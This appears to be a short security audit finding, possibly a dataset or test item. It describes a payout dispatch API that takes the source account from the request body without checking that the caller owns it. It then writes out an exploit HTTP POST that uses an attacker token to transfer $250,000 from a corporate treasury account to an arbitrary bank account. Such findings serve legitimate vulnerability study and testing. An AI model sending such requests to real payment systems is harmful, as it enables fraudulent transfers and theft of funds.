diagnosis: The payout dispatch route puts a money transfer message onto an AWS SQS FIFO queue using sourceAccountId directly from the request body without verifying that the authenticated user owns or has signing authority over sourceAccountId. Any authenticated user can drain funds from arbitrary accounts by enqueuing unauthorized payout commands.
exploit_request:
POST /api/v1/payouts/dispatch HTTP/1.1
Host: payments.internal:3000
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{
  "sourceAccountId": "act_corp_treasury_9019",
  "destinationRouting": "121000358",
  "destinationAccount": "9876543210",
  "amount": 250000.00
}
